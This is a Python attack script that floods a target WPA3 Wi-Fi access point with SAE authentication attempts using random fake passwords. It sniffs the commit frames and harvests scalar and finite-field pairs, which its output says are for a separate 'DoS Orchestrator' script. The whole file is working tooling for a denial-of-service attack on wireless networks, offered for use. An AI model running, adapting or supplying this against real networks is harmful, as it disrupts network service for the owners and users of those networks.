#!/usr/bin/env python3
"""
================================================================================
WPA3-SAE Parameter Extractor 
================================================================================
Automates the extraction of 20 valid Scalar & Finite Field pairs.
This script uses wpa_supplicant to intentionally generate fake login attempts
and sniffs the resulting cryptographic payload strings from the air.
"""

import os
import sys
import time
import string
import random
import subprocess
from scapy.all import sniff, Dot11Auth, AsyncSniffer

# ==============================================================================
# CONFIGURATION
# ==============================================================================
MANAGED_IFACE  = "wlan1"       # Normal adapter (Managed Mode)
MONITOR_IFACE  = "wlan0mon"    # Monitor Mode adapter

TARGET_SSID    = "Your_WiFi_Name"
TARGET_BSSID   = "AA:BB:CC:DD:EE:11".lower()
TARGET_CHANNEL = "11"          # Channel of the target network
NUM_PAIRS      = 20            # Number of desired values
# ==============================================================================

scalars =[]
finites =[]

def get_freq(channel):
    ch = int(channel)
    if ch == 14: return 2484
    if ch <= 13: return 2407 + (ch * 5)
    return 5000 + (ch * 5)

def get_packet_handler(current_password):
    def handler(pkt):
        global scalars, finites
        
        if pkt.haslayer(Dot11Auth) and pkt.type == 0 and pkt.subtype == 11:
            if pkt.addr1 and pkt.addr1.lower() == TARGET_BSSID:
                
                print(f"    [Debug] Auth-Frame gesehen! Algo: {pkt[Dot11Auth].algo}, Seq: {pkt[Dot11Auth].seqnum}")
                
                if pkt[Dot11Auth].algo == 3 and pkt[Dot11Auth].seqnum == 1:
                    payload = bytes(pkt[Dot11Auth].payload)
                    
                    if len(payload) >= 98:
                        group_id = payload[0:2]
                        if group_id == b'\x13\x00':  # Group 19
                            scalar = payload[2:34].hex()
                            finite = payload[34:98].hex()
                            
                            if scalar not in scalars:
                                scalars.append(scalar)
                                finites.append(finite)
                                print(f"[+] Pair {len(scalars)}/{NUM_PAIRS} extracted! (Triggered by fake PW: {current_password})")
                                return True 
        return False
    return handler

def main():
    if os.geteuid() != 0:
        sys.exit("[!] Error: This script must be run as root (sudo).")

    print(f"[*] Starting WPA3-SAE Parameter Extraction (Hidden SSID Support enabled)")
    print(f"[*] Target Network: {TARGET_SSID} ({TARGET_BSSID})")

    hidden_input = input("[?] Is the target network hidden? (y/n): ").strip().lower()

    
    freq = get_freq(TARGET_CHANNEL)
    os.system(f"iwconfig {MONITOR_IFACE} channel {TARGET_CHANNEL}")
    os.system("killall wpa_supplicant 2>/dev/null")
    time.sleep(1)
    
    while len(scalars) < NUM_PAIRS:
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        
        # HINZUGEFÜGT: scan_ssid=1 zwingt wpa_supplicant, versteckte Netzwerke aktiv zu suchen!
        conf_content = f"""network={{
    ssid="{TARGET_SSID}"
    scan_ssid=1
    bssid={TARGET_BSSID}
    scan_freq={freq}
    freq_list={freq}
    sae_password="{password}"
    key_mgmt=SAE
    ieee80211w=2
}}"""
        with open("/tmp/temp_sae_extractor.conf", "w") as f:
            f.write(conf_content)
        
        print(f"[*] Spoofing connection attempt... ({len(scalars)+1}/{NUM_PAIRS})")
        
        sniffer = AsyncSniffer(iface=MONITOR_IFACE, stop_filter=get_packet_handler(password), timeout=5)
        sniffer.start()
        
        time.sleep(0.5)
        
        wpa_cmd =["wpa_supplicant", "-i", MANAGED_IFACE, "-c", "/tmp/temp_sae_extractor.conf"]
        wpa_proc = subprocess.Popen(wpa_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        sniffer.join()
        
        wpa_proc.terminate()
        wpa_proc.wait(timeout=2)
        os.system("killall wpa_supplicant 2>/dev/null")
        time.sleep(0.5)

    print("\n" + "="*80)
    print("EXTRACTION COMPLETE! Replace the arrays in the DoS Orchestrator script with this:")
    print("="*80 + "\n")
    
    print("SAE_SCALAR_HEX_LIST =[")
    for s in scalars:
        print(f"    '{s}',")
    print("]\n")
    
    print("SAE_FINITE_HEX_LIST =[")
    for f in finites:
        print(f"    '{f}',")
    print("]\n")
    
    if os.path.exists("/tmp/temp_sae_extractor.conf"):
        os.remove("/tmp/temp_sae_extractor.conf")

if __name__ == "__main__":
    main()
